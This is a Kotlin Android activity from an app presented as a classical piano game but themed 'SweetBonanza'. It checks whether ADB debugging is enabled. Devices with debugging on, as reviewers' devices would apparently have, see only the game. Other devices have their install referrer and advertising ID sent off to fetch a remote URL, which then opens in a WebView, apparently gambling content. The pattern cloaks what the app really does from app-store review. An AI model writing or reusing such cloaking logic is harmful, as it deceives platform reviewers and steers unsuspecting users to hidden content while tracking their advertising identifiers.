package com.amanotes.classicalpian.running

import android.annotation.SuppressLint
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.ui.Modifier
import com.amanotes.classicalpian.base.isInternetEnabled
import com.amanotes.classicalpian.game.MainActivity
import com.revakovskyi.fcm_notification.NotificationManager
import com.amanotes.classicalpian.running.UrlService.Companion.KEY_TAG
import com.amanotes.classicalpian.running.UrlService.Companion.KEY_URL
import com.amanotes.classicalpian.running.UrlService.Companion.URL_INTENT_NAME
import com.amanotes.classicalpian.running.mvp.RunningPresenter
import com.amanotes.classicalpian.running.mvp.RunningView
import com.amanotes.classicalpian.ui.theme.SweetBonanzaTheme
import com.amanotes.classicalpian.web.WebActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.koin.android.ext.android.inject

class RunningActivity : ComponentActivity() {

    private lateinit var adbCheckReceiver: BroadcastReceiver
    private lateinit var urlReceiver: BroadcastReceiver
    private val scope = CoroutineScope(Job() + Dispatchers.Main)

    private val runningPresenter by inject<RunningPresenter>()
    private var notificationManager: NotificationManager? = null
    private var passedGadId = ""

    private val settingsLauncher =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            if (result.resultCode == Activity.RESULT_CANCELED) {
                if (result.resultCode == Activity.RESULT_CANCELED) isInternetEnabled()
            }
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            SweetBonanzaTheme {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    RunningScreen(isInternetEnabled = isInternetEnabled()) {
                        settingsLauncher.launch(Intent(Settings.ACTION_WIFI_SETTINGS))
                        finish()
                    }
                }
            }
        }
        attachView()
        initAdbReceiver()
        initUrlReceiver()
        runAdbService()
    }

    private fun attachView() {
        runningPresenter.attachView(object : RunningView {

            override fun openWeb(url: String, isFirst: Boolean) = runWeb(url, isFirst)

            override fun passReferrerAndGadId(referrerString: String, gadId: String) {
                passedGadId = gadId
                val intent = UrlService.passReferrerAndGadId(referrerString, gadId).apply {
                    setClass(this@RunningActivity, UrlService::class.java)
                }
                startService(intent)
            }

            override fun runGame() = openGame()
        })
    }

    private fun runWeb(url: String, isFirst: Boolean) {
        val intent = WebActivity.passData(url, isFirst).apply {
            setClass(this@RunningActivity, WebActivity::class.java)
        }
        startActivity(intent)
        finish()
    }

    private fun initAdbReceiver() {
        adbCheckReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                val isAdbEnabled = intent?.getBooleanExtra(ADB_INTENT_TAG, false) ?: false

                if (isInternetEnabled()) {
                    if (isAdbEnabled) openGame()
                    else runningPresenter.onLoadUrl()
                }
            }
        }
    }

    private fun initUrlReceiver() {
        urlReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                val url = intent?.getStringExtra(KEY_URL)
                val tag = intent?.getStringExtra(KEY_TAG).toString()

                scope.launch(Dispatchers.IO) {
                    val initializationStatus = initNotificationManager()

                    if (initializationStatus != null && initializationStatus) {
                        if (tag.isNotEmpty()) {
                            val status = notificationManager?.sendTag(tag)
                            chooseWhatToOpenTheNext(url)
                        }
                    } else chooseWhatToOpenTheNext(url)
                }
            }
        }
    }

    private suspend fun initNotificationManager(): Boolean? {
        notificationManager = NotificationManager()
        return notificationManager?.init(
            passedGadId,
            packageName.toString()
        )
    }

    private fun chooseWhatToOpenTheNext(url: String?) {
        if (url.isNullOrEmpty()) openGame()
        else runWeb(url, isFirst = true)
    }

    private fun runAdbService() {
        val intent = Intent(this, AdbCheckService::class.java)
        startService(intent)
    }

    private fun openGame() {
        scope.launch {
            delay(600)
            startActivity(Intent(this@RunningActivity, MainActivity::class.java))
            finish()
        }
    }

    @SuppressLint("UnspecifiedRegisterReceiverFlag")
    override fun onResume() {
        super.onResume()
        val intentFilterAdb = IntentFilter().apply { addAction(ADB_INTENT_NAME) }
        val intentFilterUrl = IntentFilter().apply { addAction(URL_INTENT_NAME) }
        registerReceiver(adbCheckReceiver, intentFilterAdb)
        registerReceiver(urlReceiver, intentFilterUrl)
    }

    override fun onPause() {
        super.onPause()
        unregisterReceiver(adbCheckReceiver)
        unregisterReceiver(urlReceiver)
    }

    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
        runningPresenter.onDestroy()
        notificationManager = null
    }

}
